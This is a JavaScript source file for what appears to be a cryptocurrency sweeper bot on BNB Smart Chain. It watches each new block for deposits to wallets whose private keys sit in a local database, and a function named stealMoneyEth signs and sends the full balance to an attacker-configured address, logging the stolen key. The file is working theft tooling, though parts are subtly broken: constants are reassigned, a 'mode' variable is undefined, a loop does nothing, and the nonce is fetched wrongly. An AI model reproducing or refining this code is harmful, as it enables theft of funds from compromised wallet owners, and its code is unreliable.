import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress, gasPercentBnb } from "./config.js";

let web3 = null
let data = null
let lastBlockNumber;

export async function runBnb() {
    try {
        web3 = new Web3(new Web3.providers.HttpProvider(rpc.BNB));
    } catch (error) {
        console.log("Не удалось подключиться к сети BNB")
        return;
    }
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    setInterval(getBlocksEth, 200);
}

async function getBlocksEth() {
    try {
        const lastBlock = await web3.eth.getBlock('latest', true);
        if (lastBlock.number <= lastBlockNumber) {
            return;
        }
        lastBlockNumber = lastBlock.number;
        const ethTransactions = lastBlock?.transactions;
        console.log(`Block ${lastBlock?.number} | BNB`);
        for (let transaction of ethTransactions) {
            transactionWalletEth(transaction);
        }
    } catch (error) {
        console.error(error);
    }
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.BNB, 'ether');
    const balance = await web3.eth.getBalance(address);
    const gasPrice = await web3.eth.getGasPrice();
    const gasUnits = 21000;
    const transactionCost = 0;
    const average = ((Math.random() * (2.5 - 2.1) + 2.1) + (Math.random() * (3 - 2.6) + 2.6)) / 2;

    if (mode === 1) {
        gasPrice = Math.trunc(Math.trunc(balance * gasPercentBnb / 100) / gasUnits);
        transactionCost =  Math.trunc(balance * gasPercentBnb / 100);
        const gasPriceNetwork = await web3.eth.getGasPrice();
        if (gasPrice <= gasPriceNetwork) {
            gasPrice = Math.trunc(gasPriceNetwork * average);
            transactionCost = gasUnits * gasPrice;
        }
    } else {
        gasPrice =  Math.trunc(gasPrice * average);
        transactionCost = gasUnits * gasPrice;
    }

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 56,
        "nonce": nonce,
        "to": sendAddress,
        "value": amount,
        "gas": gasUnits,
        "gasPrice": gasPrice,
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const receipt = await web3.eth.getTransactionReceipt(txHash);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ BNB | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://bscscan.com/address/${address} \nPK: ${walletKey}`);
}